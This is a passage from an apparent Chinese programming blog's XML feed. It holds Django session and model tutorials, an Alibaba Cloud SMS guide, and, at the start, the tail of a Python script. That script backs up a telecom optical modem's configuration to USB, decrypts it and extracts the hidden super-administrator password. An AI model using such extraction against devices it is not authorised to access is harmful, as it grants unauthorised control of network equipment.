class="subst">&#123;file_bak&#125;</span>，开始破解&#x27;</span>)</span><br><span class="line">            os.system(<span class="string">f&#x27;xor.exe <span class="subst">&#123;file_bak&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_bak + <span class="string">&#x27;.xml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            text = <span class="built_in">str</span>(fp.read())</span><br><span class="line">            exit(<span class="string">&#x27;超级管理员密码为：&#x27;</span> + re.findall(<span class="string">&#x27;&lt;Password&gt;(.*?)&lt;/Password&gt;&#x27;</span>, text)[<span class="number">0</span>] + <span class="string">&#x27; 如果不对，自己查看&#x27;</span> + file_bak + <span class="string">&#x27;.xml文件&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">usbbackup</span>(<span class="params">self</span>):</span><br><span class="line">        url = self.Api + <span class="string">&#x27;/usbbackup.cmd?action=backupeble&amp;sessionKey=&#x27;</span> + self.sessionKey</span><br><span class="line">        res = self.session.get(url)</span><br><span class="line">        usb_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        set1_sessionKey = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            usb_name = re.findall(<span class="string">&quot;usblist = &#x27;(.*?)\|&#x27;;&quot;</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">            set1_sessionKey = re.findall(<span class="string">&quot;(set1_sessionKey_.*?)&#x27;;&quot;</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            exit(<span class="string">&#x27;请插入U盘后重新运行，如果已经插入，建议换一个U盘&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        url = self.Api + <span class="string">f&#x27;/usbbackup.cmd?action=backup&amp;subarea=<span class="subst">&#123;usb_name&#125;</span>&amp;set1_sessionKey=&#x27;</span> + set1_sessionKey</span><br><span class="line">        res = self.session.get(url)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&#x27;Invalid Session Key, please try again&#x27;</span>) == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;备份成功！手动拔出U盘把文件复制到&#x27;</span> + os.getcwd() + <span class="string">&#x27;目录下后重新执行脚本&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self</span>):</span><br><span class="line">        res = self.session.get(self.Api + <span class="string">&#x27;/login.html&#x27;</span>)</span><br><span class="line">        sessionKey = re.findall(<span class="string">&quot;\&quot;sessionKey\&quot; value=\&quot;&#x27;\+&#x27;(.*?)&#x27;\+&#x27;&quot;</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">        data = <span class="string">f&#x27;username=<span class="subst">&#123;self.UserName&#125;</span>&amp;password=<span class="subst">&#123;self.PassWord&#125;</span>&amp;save=%B5%C7%C2%BC&amp;sessionKey=<span class="subst">&#123;sessionKey&#125;</span>&#x27;</span></span><br><span class="line">        res = self.session.post(self.Api + <span class="string">&#x27;/login.cgi&#x27;</span>, data=data)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sessionKey = re.findall(<span class="string">&quot;sessionKey=&#x27;(.*?)&#x27;;&quot;</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            exit(<span class="string">&#x27;登录失败，账号或密码错误！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 如果ip地址不一样，自己改一下</span></span><br><span class="line">    Api = <span class="string">&#x27;http://192.168.1.1:8080&#x27;</span></span><br><span class="line">    <span class="comment"># 自己改成路由器后面的账号密码</span></span><br><span class="line">    UserName = <span class="string">&#x27;useradmin&#x27;</span></span><br><span class="line">    PassWord = <span class="string">&#x27;mrpzm&#x27;</span></span><br><span class="line">    gm = GuanMao(Api, UserName, PassWord)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 超级管理密码 </tag>
            
            <tag> 电信光猫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django会话学习</title>
      <link href="/posts/7490/"/>
      <url>/posts/7490/</url>
      
        <content type="html"><![CDATA[<p>HTTP被设计为”⽆态”，也就是俗称“脸盲”。 这⼀次请求和下⼀次请求 之间没有任<br>何状态保持，我们⽆法根据请求的任何⽅⾯(IP地址，⽤户代理等)来识别来⾃同⼀<br>⼈的连续请求。实现状态保持的⽅式：在客户端或服务器端存储与会话有关的数据<br>（客户端与服务器端的⼀次通信，就是⼀次会话），所以引入以下技术：</p><ul><li>cookie</li><li>session</li></ul><p>不同的请求者之间不会共享这些数据，cookie和session与请求者⼀⼀对应。</p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h3 id="cookie是什么"><a href="#cookie是什么" class="headerlink" title="cookie是什么"></a>cookie是什么</h3><p>cookies 是浏览器为 Web 服务器存的⼀小信息。 每次浏览器从某个服务器请求页面时，都会自动带上以前收到的cookie。cookie保存在客户端，安全性较差，注意不要保存敏感信息。典型应用：网站登录</p><h3 id="设置Cookie"><a href="#设置Cookie" class="headerlink" title="设置Cookie"></a>设置Cookie</h3><p>Django使用HttpResponse的set_cookie方法来设置对象，使用redirect重定向指定一个地址，用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response = redirect(reverse(<span class="string">&#x27;admin:index&#x27;</span>))</span><br><span class="line">response.set_cookie(cookie名称, value=<span class="string">&#x27;cookie值&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">key</td><td align="center">cookie的名称</td></tr><tr><td align="center">value</td><td align="center">cookie的值,默认是空字符</td></tr><tr><td align="center">max_age</td><td align="center">cookies的持续有效时间（以秒计），如果设置为 None，cookies 在 浏览器关闭的时候就失效了。</td></tr><tr><td align="center">expires</td><td align="center">cookies的过期时间，格式:”Wdy, DD-Mth-YY HH:MM:SS GMT” 如果 设置这个参数，它将覆盖max_age。</td></tr><tr><td align="center">path</td><td align="center">cookie⽣效的路径前缀，浏览器只会把cookie回传给带有该路径的⻚ ⾯，这样你可以避免将cookie传给站点中的其他的应⽤。&#x2F; 表示根路径，特殊的：根路径的cookie可以 被任何url的⻚⾯访问</td></tr><tr><td align="center">domain</td><td align="center">cookie⽣效的站点。你可⽤这个参数来构造⼀个跨站cookie。如， domain&#x3D;”.example.com” 所构造的，cookie对下⾯这些站点都是可 读的： <a href="http://www.example.com/">www.example.com</a> 、 www2.example.com。如果该参数设置为None，cookie只能由设置它的站点读取。</td></tr><tr><td align="center">secure</td><td align="center">如果设置为 True ，浏览器将通过HTTPS来回传cookie。</td></tr><tr><td align="center">httponly</td><td align="center">仅http传输 不能使⽤js获取cookie</td></tr></tbody></table><ul><li>set_signed_cookie</li></ul><p>set_signed_cookie同set_cookie,不同点在于设置salt，即加盐，加密存储cookie数据:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.set_signed_cookie(<span class="string">&#x27;username&#x27;</span>, data[<span class="string">&#x27;username&#x27;</span>],salt=<span class="string">&#x27;盐值&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h3><p>获取cookies用于判断用户状态，确定前往页面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username = request.COOKIES<span class="comment"># 获取用户请求的所有cookie</span></span><br><span class="line">username = request.COOKIES.get(<span class="string">&#x27;username&#x27;</span>)<span class="comment"># 获取键名为username的cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取加“盐”的cookie</span></span><br><span class="line">request.get_signed_cookie(key, default=RAISE_ERROR, salt=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">max_age=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><h3 id="删除cookie"><a href="#删除cookie" class="headerlink" title="删除cookie"></a>删除cookie</h3><p>删除cookie用于用户退出登录场景，服务器中把cookies删除，返回给浏览器，浏览器会清除本地cookie。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response = render(request, <span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">response.delete_cookie(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><h2 id="路由保护"><a href="#路由保护" class="headerlink" title="路由保护"></a>路由保护</h2><p>路由保护简单理解为保护url地址不被非法请求，那些条件能访问，那些条件不能访问；比如后台管理，得全部保护，访问条件是管理员登录。</p><h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>Python修饰器就像注入一样，我把它理解成公用代码指定。先定义一个修饰器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_login</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">request, **kwargs</span>): <span class="comment"># 两个参数，第一个参数是request，第二个参数可以是多个参数</span></span><br><span class="line">        username = request.COOKIES.get(<span class="string">&#x27;username&#x27;</span>) <span class="comment"># 取到当前请求页面有没有cookie</span></span><br><span class="line">        <span class="keyword">if</span> username:<span class="comment"># 如果有cookie就调用被修饰的对象</span></span><br><span class="line">            <span class="keyword">return</span> func(request, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:<span class="comment"># 负责重定向到登录页面</span></span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&#x27;admin:login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> inner</span><br></pre></td></tr></table></figure><h3 id="使用修饰器"><a href="#使用修饰器" class="headerlink" title="使用修饰器"></a>使用修饰器</h3><p>在需要验证是否登录的视图函数前使用修饰器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@check_login</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># print(request.META[&#x27;HTTP_USER_AGENT&#x27;])</span></span><br><span class="line">    active_ind = <span class="string">&#x27;active&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;index.html&#x27;</span>, <span class="built_in">locals</span>())</span><br></pre></td></tr></table></figure><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>cookie看似解决了HTTP（短连接、⽆状态）的会话保持问题，但把全部⽤户数据 保存在客户端，存在安全隐患， 于是session出现了。我们可以 把关于⽤户的数据保存在服务端，在客户端cookie ⾥加⼀个sessionID（随机字符串）。其⼯作流程： </p><ul><li>当⽤户来访问服务端时,服务端会⽣成⼀个随机字符串；</li><li>当⽤户登录成功后 把 {sessionID :随机字符串} 组织成键值对加到cookie⾥发 送给⽤户； </li><li>服务器以发送给客户端 cookie中的随机字符串做键，⽤户信息做值，保存⽤ 户信息； </li><li>再访问服务时客户端会带上sessionid，服务器根据sessionid来确认⽤户是否 访问过⽹站</li></ul><h3 id="seesion和cookie"><a href="#seesion和cookie" class="headerlink" title="seesion和cookie"></a>seesion和cookie</h3><ul><li>区别<ul><li>session将数据存储与服务器端 cookie存储在客户端</li><li>cookie 存储在客户端，不安全，session存储在服务器端，客户端只存 sesseionid,安全</li><li>cookie在客户端存储值有⼤⼩的限制，⼤约⼏kb，session没有限制</li></ul></li><li>联系<ul><li>session基于cookie实现</li></ul></li></ul><h3 id="session配置"><a href="#session配置" class="headerlink" title="session配置"></a>session配置</h3><p>Django默认已经开启了session，配置位置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line"><span class="string">&#x27;django.contrib.sessions&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">MIDDLEWARE = [</span><br><span class="line"><span class="string">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>进⾏数据迁移，⽣成session使⽤的数据库表</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations#生成数据库迁移文件</span><br><span class="line">python manage.py migrate#执行迁移文件</span><br></pre></td></tr></table></figure><h3 id="session设置"><a href="#session设置" class="headerlink" title="session设置"></a>session设置</h3><p>session设置起来比cookies简单，cookies需要构造响应对象，seesion直接在request对象中设置即可自动返回sessionid到客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.session[<span class="string">&#x27;username&#x27;</span>] = username</span><br></pre></td></tr></table></figure><h3 id="seesion获取"><a href="#seesion获取" class="headerlink" title="seesion获取"></a>seesion获取</h3><p>获取也是调用request对象的seesion方法，返回键名值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = request.session.get(<span class="string">&#x27;username&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="session删除"><a href="#session删除" class="headerlink" title="session删除"></a>session删除</h3><ul><li>clear() 清空所有session 但是不会将session表中的数据删除 </li><li>flush() 清空所有 并删除表中的数据 </li><li>logout() 退出登录 清除所有 并删除表中的数据 </li><li>del req.session[‘key’] 删除某⼀个session的值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>(<span class="params">request</span>):</span><br><span class="line">    request.session.flush()</span><br><span class="line">    <span class="keyword">return</span> redirect(reverse(<span class="string">&#x27;admin:login&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="session过期时间"><a href="#session过期时间" class="headerlink" title="session过期时间"></a>session过期时间</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.session.set_expiry(<span class="number">5</span>)<span class="comment">#单位是秒</span></span><br></pre></td></tr></table></figure><h2 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h2><p>Django基础学习：<a href="https://www.xpctf.cn/posts/24c5/">https://www.xpctf.cn/posts/24c5/</a><br>Django晋级学习：<a href="https://www.xpctf.cn/posts/2f99/">https://www.xpctf.cn/posts/2f99/</a><br>Django模型学习：<a href="https://www.xpctf.cn/posts/d0b4/">https://www.xpctf.cn/posts/d0b4/</a><br>Django会话学习：<a href="https://www.xpctf.cn/posts/7490/">https://www.xpctf.cn/posts/7490/</a><br>Django Form学习：正在写</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python实现验证码发送</title>
      <link href="/posts/aade/"/>
      <url>/posts/aade/</url>
      
        <content type="html"><![CDATA[<blockquote><p>APP、⽹站注册账号，向⼿机下发验证码； 登录账户、异地登录时的安全提醒； 找回密码时的安全验证； ⽀付认证、身份校验、⼿机绑定等。本例采⽤阿里云短信验证</p></blockquote><h2 id="开通阿里云短信服务"><a href="#开通阿里云短信服务" class="headerlink" title="开通阿里云短信服务"></a>开通阿里云短信服务</h2><h3 id="登录控制台"><a href="#登录控制台" class="headerlink" title="登录控制台"></a>登录控制台</h3><p>阿里云：<a href="https://www.aliyun.com/">https://www.aliyun.com/</a></p><p>登录阿里云后点击右上角的控制台，点击阿里云logo旁边的菜单按钮，选择””产品与服务”，在搜索框输入”短信”，在”云通信”列表中点击”短信服务”进入短信服务控制台</p><p><img src="https://img.xpctf.cn/img/20201019113913.png"></p><h3 id="开通短信服务"><a href="#开通短信服务" class="headerlink" title="开通短信服务"></a>开通短信服务</h3><p>首次进入短信服务阿里云会提示你开通短信服务，短信服务按量收费，你不用就不会收费。</p><h3 id="申请签名"><a href="#申请签名" class="headerlink" title="申请签名"></a>申请签名</h3><p>个人用户只能申请一个签名，审核时间过长(2小时左右)，我没法做演示。</p><p>进入控制台后选择”国内消息”，之后选择签名管理，点击添加签名按照要求填写内容即可，签名名称要是有个准确的应用名称，不能出现测试之类的词汇。</p><p><img src="https://img.xpctf.cn/img/20201019115438.png"></p><p>审核通过的签名</p><p><img src="https://img.xpctf.cn/img/20201019114950.png"></p><h3 id="申请模板"><a href="#申请模板" class="headerlink" title="申请模板"></a>申请模板</h3><p>模板是你短信内容的格式，格式为：【签名名称】模板内容</p><p><img src="https://img.xpctf.cn/img/20201019115223.png"></p><p>进入控制台后选择”模板管理”，之后点击”添加模板”,按照填写要求填写模板即可，”${code}”是有个验证码变量，”code”是变量名，调用的使用要对应你得模板变量名。</p><p><img src="https://img.xpctf.cn/img/20201019115345.png"></p><h2 id="创建AccessKey"><a href="#创建AccessKey" class="headerlink" title="创建AccessKey"></a>创建AccessKey</h2><blockquote><p>AccessKey用于调用阿里云短信服务器的密钥</p></blockquote><p>点击你的用户头像，选择”AccessKey管理”</p><p><img src="https://img.xpctf.cn/img/20201019131710.png"></p><p>进入后如果你没有RAM 子用户，阿里云会询问你是否创建RAM 子用户，我也搞不懂RAM 子用户是什么东西，反正我不用，选择”继续使用AccessKey”</p><p><img src="https://img.xpctf.cn/img/20201019120353.png"></p><p>创建删除AccessKey属于敏感操作，所以要验证用户手机号，点击”创建AccessKey”，验证手机号后即可创建成功，这时候会弹出AccesKey的ACCESS_KEY_ID和ACCESS_KEY_SECRET，把它们复制下来，调用的时候需要用到。(保护好自己AccessKey)</p><h2 id="Python调用"><a href="#Python调用" class="headerlink" title="Python调用"></a>Python调用</h2><h3 id="充值阿里云"><a href="#充值阿里云" class="headerlink" title="充值阿里云"></a>充值阿里云</h3><p>如果你的阿里云账户没钱的先充一块钱用于支付验证码费用，好像是0.045一条，在控制台点击费用即可充值阿里云余额。</p><h3 id="安装阿里云SDK核心库"><a href="#安装阿里云SDK核心库" class="headerlink" title="安装阿里云SDK核心库"></a>安装阿里云SDK核心库</h3><p>如果您使用的是Python 3.x，执行以下命令按照阿里云SDK核心库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install aliyun-python-sdk-core-v3 -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure><p>我得电脑安装了Python2.x和Python3.x，所以使用pip3安装。</p><h3 id="创建Client实例"><a href="#创建Client实例" class="headerlink" title="创建Client实例"></a>创建Client实例</h3><blockquote><p>在创建Client实例时，您需要获取 AccessKey ID和AccessKey Secret，就是上面创建的AccessKey。</p></blockquote><p>新建SMS.py文件，导入阿里云SDK：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> aliyunsdkcore.client <span class="keyword">import</span> AcsClient</span><br><span class="line"><span class="keyword">from</span> aliyunsdkcore.request <span class="keyword">import</span> CommonRequest</span><br></pre></td></tr></table></figure><p>定义ACCESS_KEY_ID和ACCESS_KEY_SECRET变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ACCESS_KEY_ID = <span class="string">&quot;********&quot;</span>  <span class="comment">#用户AccessKeyID  需要根据自己的账户修改，上面申请保存的</span></span><br><span class="line">ACCESS_KEY_SECRET = <span class="string">&quot;************&quot;</span>  <span class="comment">#Access Key Secret  需要根据自己的账户修改，上面申请保存的</span></span><br></pre></td></tr></table></figure><p>定义SMS调用阿里云发送类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SMS</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, signName, templateCode</span>):</span><br><span class="line">        self.signName = signName  <span class="comment">#签名</span></span><br><span class="line">        self.templateCode = templateCode  <span class="comment">#模板code</span></span><br><span class="line">        self.client = client = AcsClient(ACCESS_KEY_ID, ACCESS_KEY_SECRET, <span class="string">&#x27;cn-hangzhou&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self,phone_numbers,template_param</span>):</span><br><span class="line">        request = CommonRequest()</span><br><span class="line">        request.set_accept_format(<span class="string">&#x27;json&#x27;</span>)</span><br><span class="line">        request.set_domain(<span class="string">&#x27;dysmsapi.aliyuncs.com&#x27;</span>)</span><br><span class="line">        request.set_method(<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line">        request.set_protocol_type(<span class="string">&#x27;https&#x27;</span>)  <span class="comment"># https | http</span></span><br><span class="line">        request.set_version(<span class="string">&#x27;2017-05-25&#x27;</span>)</span><br><span class="line">        request.set_action_name(<span class="string">&#x27;SendSms&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        request.add_query_param(<span class="string">&#x27;RegionId&#x27;</span>, <span class="string">&quot;cn-hangzhou&quot;</span>)</span><br><span class="line">        request.add_query_param(<span class="string">&#x27;PhoneNumbers&#x27;</span>, phone_numbers)</span><br><span class="line">        request.add_query_param(<span class="string">&#x27;SignName&#x27;</span>, self.signName)</span><br><span class="line">        request.add_query_param(<span class="string">&#x27;TemplateCode&#x27;</span>, self.templateCode)</span><br><span class="line">        request.add_query_param(<span class="string">&#x27;TemplateParam&#x27;</span>, template_param)</span><br><span class="line">        response = self.client.do_action_with_exception(request)</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>实例化SMS类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sms = SMS(<span class="string">&quot;签名名称&quot;</span>, <span class="string">&quot;模版CODE&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="调用sms对象"><a href="#调用sms对象" class="headerlink" title="调用sms对象"></a>调用sms对象</h3><p>新建test.py文件，导入SMS.py的sms对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> SMS <span class="keyword">import</span> sms</span><br></pre></td></tr></table></figure><p>导入随机数生成模块，用于生成验证码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br></pre></td></tr></table></figure><p>使用rendint模块生成100000-999999的随机数验证码，阿里云规定调用方式为有个字典，键名为模块变量名，值为随机数验证码，code是申请的模块变量名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;&#123;&#x27;code&#x27;:%s&#125;&quot;</span>%(randint(<span class="number">100000</span>,<span class="number">999999</span>))</span><br><span class="line"><span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure><p>调用SMS.py的sms对象的send方法发送验证码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = sms.send(<span class="string">&#x27;接收验证码的手机号&#x27;</span>,code)</span><br></pre></td></tr></table></figure><p>sms对象返回发送状态，因为返回的是字节流，使用utf-8解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(res.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>sms.send方法返回一个字典，Message是发送状态，如果错误会返回错误信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;code&#x27;</span>:<span class="number">802881</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;Message&quot;</span>:<span class="string">&quot;OK&quot;</span>,<span class="string">&quot;RequestId&quot;</span>:<span class="string">&quot;5FDA1D80-DF1C-43C2-AEEC-1E6138C913B7&quot;</span>,<span class="string">&quot;BizId&quot;</span>:<span class="string">&quot;159702503082260359^0&quot;</span>,<span class="string">&quot;Code&quot;</span>:<span class="string">&quot;OK&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>错误返回：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;Message&quot;</span>:<span class="string">&quot;1848936invalid mobile number&quot;</span>,<span class="string">&quot;RequestId&quot;</span>:<span class="string">&quot;7ADAE105-6D67-4A83-BF3E-3A65AE26E590&quot;</span>,<span class="string">&quot;Code&quot;</span>:<span class="string">&quot;isv.MOBILE_NUMBER_ILLEGAL&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>手机接到的验证码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">【异清轩博客管理系统】验证码为：802881，您正在注册成为平台会员，感谢您的支持！</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 验证码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django模型学习</title>
      <link href="/posts/d0b4/"/>
      <url>/posts/d0b4/</url>
      
        <content type="html"><![CDATA[<h2 id="模型使用流程"><a href="#模型使用流程" class="headerlink" title="模型使用流程"></a>模型使用流程</h2><ul><li>配置数据库</li><li>定义模型类</li><li>激活模型</li><li>使用模型</li></ul><h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>Django默认使⽤的是sqlite，但在⽣产环境中⼀般会⽤mysql、postgrsql、oracle 等关系型数据库。 </p><p>在开发环境中，安装mysql的数据库驱动mysqlclient，mysqlclient是连接mysql的驱动，不能提供数据库服务，需要单独安装mysql。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install mysqlclient</span><br></pre></td></tr></table></figure><p>在项⽬的 settings.py ⽂件中找到 DATABASES 配置项，将其信息修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line"> <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line"> <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>, <span class="comment">#mysql数据库引擎</span></span><br><span class="line"> <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="comment">#数据库名</span></span><br><span class="line"> <span class="string">&#x27;HOST&#x27;</span>:<span class="string">&#x27;localhost&#x27;</span>, <span class="comment">#数据库服务器地址</span></span><br><span class="line"> <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="comment">#mysql数据库⽤户名</span></span><br><span class="line"> <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;test123&#x27;</span>, <span class="comment">#密码</span></span><br><span class="line"> <span class="string">&#x27;PORT&#x27;</span>:<span class="number">3306</span>, <span class="comment">#端⼝号，可选</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><p><img src="https://img.xpctf.cn/img/20201015201440.png"></p><p>对象关系映射（Oject Relational Mapping，简称ORM）模式是⼀种为了解决⾯向 对象与关系数据库存在的互不匹配的现象的技术。简单的说，ORM是通过使⽤描 